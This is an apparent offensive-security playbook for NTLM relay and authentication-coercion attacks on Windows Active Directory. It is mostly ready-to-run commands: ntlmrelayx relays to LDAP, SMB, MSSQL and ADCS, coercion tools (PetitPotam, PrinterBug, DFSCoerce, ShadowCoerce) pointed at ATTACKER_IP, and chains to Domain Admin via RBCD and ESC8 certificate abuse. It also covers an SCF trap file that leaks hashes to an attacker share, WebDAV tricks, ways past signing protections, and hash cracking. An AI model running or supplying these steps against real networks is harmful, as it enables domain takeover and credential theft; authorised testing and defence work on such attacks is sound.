# NTLM Relay and Authentication Coercion

## When this applies

- Target is a Windows network with SMB signing **not required** on at least one host (DCs sign by default; member servers/workstations often don't).
- You have network position to relay (LAN, VPN, or coerced authentication callback).
- Goal is to relay incoming NTLM authentication from a privileged identity (e.g. machine account, admin) to another service (LDAP, SMB, HTTP, MSSQL) and act under that identity.

## Technique

Run an SMB/HTTP listener that captures inbound NTLM authentication and forwards it (`ntlmrelayx`) to a target service. Trigger inbound auth with a coercion primitive (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce) — these RPCs make a victim machine auth back to an attacker-controlled UNC path. The relayed session inherits the victim's privileges on the target.

## Steps

### 1. Identify relay-vulnerable targets

```bash
# SMB signing not required → relay candidate
nxc smb TARGET_RANGE --gen-relay-list relay-targets.txt

# Or with nmap
nmap --script smb2-security-mode -p445 TARGET_RANGE
```

Hosts with `Message signing enabled but not required` are relay candidates. DCs typically require signing — skip them.

LDAP signing/channel-binding are the LDAP equivalents:

```bash
# LDAP signing required check
nxc ldap DC -u '' -p '' --signing
```

### 2. Set up the relay

```bash
# Relay to SMB on a list of targets (lateral movement)
impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks

# Relay to LDAP for AD ACL abuse / RBCD setup
impacket-ntlmrelayx -t ldap://DC --escalate-user PWNED_USER -smb2support

# Relay to LDAPS for changing user attributes
impacket-ntlmrelayx -t ldaps://DC --delegate-access --escalate-user PWNED_USER

# Relay to MSSQL
impacket-ntlmrelayx -t mssql://TARGET -smb2support
```

`-socks` opens a SOCKS proxy for each authenticated session — chain through with `proxychains nxc smb TARGET -u user -p pass`.

### 3. Authentication coercion primitives

#### PetitPotam (MS-EFSRPC)

```bash
# Coerce DC$ to authenticate to ATTACKER_IP
python3 PetitPotam.py ATTACKER_IP DC_IP

# With creds (when unauthenticated patched)
python3 PetitPotam.py -u user -p pass -d domain ATTACKER_IP DC_IP
```

CVE-2021-36942. Uses `EfsRpcOpenFileRaw` (and other EFSRPC methods) to make the target read a UNC path.

#### PrinterBug (MS-RPRN)

```bash
# Print Spooler must be running (default on most Windows)
python3 dementor.py -d domain -u user -p pass ATTACKER_IP DC_IP
# or impacket: rpcdump.py @TARGET to confirm spooler exposed
```

`RpcRemoteFindFirstPrinterChangeNotificationEx` causes the victim to authenticate to the attacker's UNC path.

#### DFSCoerce (MS-DFSNM)

```bash
python3 dfscoerce.py -u user -p pass -d domain ATTACKER_IP DC_IP
```

`NetrDfsRemoveStdRoot` and related DFS RPC methods force machine-account authentication. Often unpatched even when PetitPotam is patched.

#### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p pass -d domain ATTACKER_IP DC_IP
```

File Server VSS Agent service — coerces authentication via `IsPathSupported`. Service must be running.

#### Coercer (multi-protocol fuzzer)

```bash
# Try every known RPC coercion method
coercer coerce -u user -p pass -d domain -l ATTACKER_IP -t TARGET
```

### 4. Common chains

#### Coerce → relay to LDAP → RBCD

1. Coerce `TARGET$` to authenticate to ATTACKER_IP via PetitPotam.
2. Relay to LDAP/LDAPS on the DC.
3. `--delegate-access` adds an attacker-controlled computer to `msDS-AllowedToActOnBehalfOfOtherIdentity` of TARGET.
4. Use `getST.py` to request a service ticket as any user (including Domain Admin) to TARGET via S4U2Self+S4U2Proxy.

#### Coerce → relay to ADCS HTTP enrollment (ESC8)

1. Coerce `DC$` to authenticate to ATTACKER_IP.
2. Relay to `http://ADCS_HOST/certsrv/certfnsh.asp`.
3. Request a `DomainController` template cert.
4. Use the cert for PKINIT → DC TGT → DCSync.

```bash
impacket-ntlmrelayx -t http://ADCS/certsrv/certfnsh.asp \
    --adcs --template DomainController -smb2support
```

### 5. WebDAV / HTTP coercion

When SMB outbound is blocked, force authentication over HTTP using WebDAV:

```bash
# WebDAV listener (Responder or impacket-smbserver alternative)
responder -I eth0 -wfd

# UNC path with @SSL or @port — Windows WebClient retries over WebDAV
\\ATTACKER@80\share\file
\\ATTACKER@SSL@443\share\file
```

The Windows WebClient service must be running. On older systems it auto-starts; modern Windows often requires manual start (or coercion via `searchprotocolhost.exe`).

### 6. SCF / URL / LNK file UNC pull

When a writable share is browsed by users/admins:

```bash
cat > theft.scf << 'EOF'
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# Host SMB listener to capture NTLMv2 hash
smbserver.py -smb2support share ./
```

Other UNC trigger files: `.url` (IconFile=), `.lnk` (icon path), `.library-ms`, `desktop.ini`. When the share is opened in Explorer, Windows auto-renders icons → outbound auth.

#### macOS gotchas (Sequoia/Sonoma; Linux unaffected)

1. `-ip <specific_VPN_IP>` silently fails to bind 445 — omit it (let it wildcard).
2. Even with wildcard bind, the macOS Application Firewall + VPN routing combo drops INBOUND TCP/445 from the VPN tun for unsigned Python listeners. The listener shows `*:445 (LISTEN)` in lsof but `nc -w 3 <vpn_ip> 445` from another VPN host hangs. HTTP on 8000-9999 still works fine, only SMB on privileged ports is affected.

Fix options: (a) `sudo pfctl -d` (firewall down — requires sudo TTY), (b) run smbserver inside a Linux Docker container with `--network host` (Docker bypasses the macOS firewall), (c) tunnel via `ngrok tcp 445` / `tmate` to expose a Linux relay's 445 to the VPN target.

This matters for SMB-required exploits: ThemeBleed (CVE-2023-38146), RemotePotato0, NTLM-relay over SCF UNC pull, .lnk icon-pull capture.

### 7. Cracking captured hashes (when relay isn't viable)

```bash
# NTLMv2 captured by Responder/smbserver
hashcat -m 5600 ntlmv2.txt rockyou.txt
john --format=netntlmv2 ntlmv2.txt
```

NTLMv2 hashes can't be relayed easily but can be cracked offline if the password is weak.

## Verifying success

- ntlmrelayx output shows `Authenticating against TARGET as USER SUCCEED`.
- `--socks` proxy lists active sessions (`socks` command in console).
- For LDAP relay: new ACL/object visible (`Get-ADObject` shows the `--escalate-user` granted DCSync rights).
- For SMB relay: dumped SAM hashes, secretsdump output, or new local admin account.

## Common pitfalls

- **DCs require SMB signing** — almost always. Don't relay back to a DC for SMB; use LDAP/LDAPS or HTTP/ADCS instead.
- **MIC (Message Integrity Code)** in NTLM authentication blocks cross-protocol relays unless you strip MIC (CVE-2019-1040 mitigations apply).
- **Channel binding (EPA)** on LDAPS/HTTPS blocks LDAP/HTTP relay — `--remove-mic` and Drop The MIC bypass may help on unpatched targets.
- **Patched coercion**: PetitPotam unauthenticated path was patched in MS-Aug-2021. Need creds for some primitives. DFSCoerce/PrinterBug often still work.
- **Print Spooler disabled** on hardened DCs — PrinterBug fails. Try DFSCoerce/PetitPotam.
- **Outbound 445 blocked** between segments — coercion fails. Use WebDAV (HTTP) instead.
- **Account lockout** — relay attempts that fail repeatedly may lock the victim account if `--target-pages` is misconfigured.

## Tools

- impacket-ntlmrelayx (the relay engine)
- impacket-smbserver (SMB listener for hash capture)
- Responder (broadcast poisoning + LLMNR/NBT-NS + WPAD)
- PetitPotam, dfscoerce, shadowcoerce, dementor (specific coercers)
- Coercer (multi-protocol coercion fuzzer)
- nxc / crackmapexec (`--gen-relay-list`, post-auth verification)
- mitm6 (IPv6 DHCP-based authentication coercion — see `scenarios/ipv6/slaac-attack.md`)
